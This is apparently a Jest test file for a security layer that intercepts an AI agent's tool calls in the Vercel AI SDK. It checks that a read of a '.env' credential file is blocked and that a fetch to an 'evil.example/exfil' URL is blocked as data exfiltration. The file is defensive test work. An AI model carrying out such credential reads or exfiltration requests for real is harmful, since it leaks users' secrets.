import { describe, expect, it, jest } from '@jest/globals';
import {
  createToolwallToolFactory,
  toolwallTool,
  withToolwall,
} from '../src/index.js';

describe('Vercel AI SDK Toolwall interceptor', () => {
  it('passes clean Vercel tool executions through to execute', async () => {
    const execute = jest.fn(async (args: Record<string, unknown>) => ({
      ok: true,
      args,
    }));
    const wrapped = withToolwall({
      name: 'search_files',
      execute,
    });

    await expect(wrapped.execute?.({ query: 'find README examples' })).resolves.toEqual({
      ok: true,
      args: { query: 'find README examples' },
    });
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it('fails closed before Vercel tool execute when the AST filter blocks a payload', async () => {
    const execute = jest.fn(async () => ({ ok: true }));
    const wrapped = toolwallTool({
      name: 'read_file',
      execute,
    });

    await expect(wrapped.execute?.({ path: '.env' })).rejects.toMatchObject({
      code: 'SENSITIVE_PATH_BLOCKED',
    });
    expect(execute).not.toHaveBeenCalled();
  });

  it('wraps a Vercel tool() factory so every execution is validated', async () => {
    const execute = jest.fn(async (args: Record<string, unknown>) => args);
    const toolFactory = jest.fn((definition: { execute?: typeof execute }) => definition);
    const secureTool = createToolwallToolFactory(toolFactory);

    const wrapped = secureTool({
      name: 'fetch_url',
      execute,
    });

    await expect(wrapped.execute?.({ url: 'https://evil.example/exfil?a=x&b=y&c=z' })).rejects.toMatchObject({
      code: 'SHADOWLEAK_DETECTED',
    });
    expect(toolFactory).toHaveBeenCalledTimes(1);
    expect(execute).not.toHaveBeenCalled();
  });
});
